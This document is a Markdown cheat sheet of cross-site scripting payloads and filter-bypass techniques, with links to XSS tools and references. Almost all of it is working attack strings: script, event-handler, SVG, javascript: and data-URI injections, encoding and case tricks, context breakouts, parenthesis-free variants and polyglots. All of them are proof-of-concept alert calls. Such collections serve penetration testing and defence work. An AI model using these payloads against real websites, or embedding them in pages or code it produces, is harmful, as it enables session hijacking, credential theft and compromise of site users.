# XSS Bypass Techniques & Payloads

## Basic Payloads
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
```

---

## Encoding Bypasses

### URL Encoding
```
%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Double Encoding
```
%253Cscript%253Ealert(1)%253C%252Fscript%253E
```

### Hex Encoding
```html
<scr\x69pt>alert(1)</scr\x69pt>
<img src=x onerror=\x61lert(1)>
```

### HTML Entity Encoding
```html
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
```

### Unicode
```html
<script>\u0061lert(1)</script>
```

---

## Case Variation
```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>
```

## Null Byte
```html
<scr%00ipt>alert(1)</scr%00ipt>
```

---

## Event Handlers

### Common Events
```html
<img src=x onerror=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<object data=javascript:alert(1)>
<iframe onload=alert(1)>
```

### Focus Events
```html
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
```

### Mouse Events
```html
<div onmouseover=alert(1)>hover</div>
<a onmouseenter=alert(1)>hover</a>
<a onmousemove=alert(1)>move</a>
```

---

## Attribute Injection

### Break Out of Quotes
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
" autofocus onfocus="alert(1)
```

### No Quotes
```html
<img src=x onerror=alert(1)>
```

### Backticks (older browsers)
```html
<img src=x onerror=`alert(1)`>
```

---

## SVG Payloads
```html
<svg onload=alert(1)>
<svg/onload=alert(1)>
<svg><script>alert(1)</script></svg>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=1>
```

---

## JavaScript Protocol
```html
<a href="javascript:alert(1)">click</a>
<a href="java&#115;cript:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><input type=submit>
```

---

## Data URI
```html
<a href="data:text/html,<script>alert(1)</script>">click</a>
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
```

---

## Breaking Out of Context

### Inside Script Tag
```javascript
</script><script>alert(1)</script>
';alert(1)//
";alert(1)//
```

### Inside HTML Comment
```html
--><script>alert(1)</script><!--
```

### Inside Style
```html
</style><script>alert(1)</script>
```

---

## Filter Bypass Tricks

### Without Parentheses
```javascript
alert`1`
onerror=alert`1`
throw onerror=alert,1
```

### Without alert
```javascript
confirm(1)
prompt(1)
console.log(1)
document.write('XSS')
eval('ale'+'rt(1)')
```

### Without Spaces
```html
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

### Using Comments
```html
<script>al/**/ert(1)</script>
```

---

## Malformed Tags
```html
<scrip<script>t>alert(1)</scrip</script>t>
<<script>alert(1)//<</script>
<scr\nipt>alert(1)</scr\nipt>
```

---

## DOM XSS Sinks
```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
eval()
setTimeout()
setInterval()
location.href
location.assign()
window.open()
```

## DOM XSS Sources
```javascript
// User-controlled input
location.hash
location.search
document.URL
document.referrer
window.name
postMessage data
```

---

## Polyglot Payloads
```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

---

## Tools
- https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
- https://github.com/s0md3v/XSStrike
- https://github.com/rajeshmajumdar/BruteXSS

## References
- https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
